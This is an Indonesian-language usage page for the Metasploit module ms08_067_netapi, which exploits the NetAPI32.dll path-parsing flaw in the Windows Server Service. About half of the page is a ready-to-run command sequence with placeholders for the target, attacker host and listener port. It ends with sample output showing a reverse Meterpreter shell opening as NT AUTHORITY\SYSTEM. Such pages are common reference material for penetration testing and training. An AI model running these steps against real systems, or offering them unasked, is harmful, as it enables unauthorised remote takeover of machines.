# ms08_067_netapi

Modul ini memanfaatkan kelemahan parsing dalam kode kanonisasi jalur pada `NetAPI32.dll` melalui Server Service. Modul ini mampu melewati `NX` pada beberapa sistem operasi dan service pack. Target yang tepat harus digunakan untuk mencegah Server Service (bersama dengan belasan layanan lain dalam proses yang sama) mengalami crash. Target `Windows XP` tampaknya dapat menangani beberapa kejadian eksploitasi yang berhasil, tetapi target `Windows 2003` sering kali mengalami crash atau hang pada percobaan berikutnya. Ini hanyalah versi pertama dari modul ini, dukungan penuh untuk bypass `NX` pada `Windows 2003`, bersama dengan platform lain, masih dalam pengembangan.

## Penulis
- hdm x@hdm.io
- Brett Moore brett.moore@insomniasec.com
- frank2 frank2@dc949.org
- jduck jduck@metasploit.com

## Platform
- `Windows`

## Cara Penggunaan di Metasploit

```
use exploit/windows/smb/ms08_067_netapi
set PAYLOAD <PAYLOAD>
set RHOSTS <IP_TARGET>
set RPORT 445
set SMBPIPE BROWSER
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] 192.168.1.54:445 - Automatically detecting the target...
[*] 192.168.1.54:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.1.54:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.1.54:445 - Attempting to trigger the vulnerability...
[*] Sending stage (177734 bytes) to 192.168.1.54
[*] Meterpreter session 4 opened (192.168.1.11:4444 -> 192.168.1.54:1033) at 2025-05-17 09:14:22 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

## Referensi
- [Rapid7](https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/)
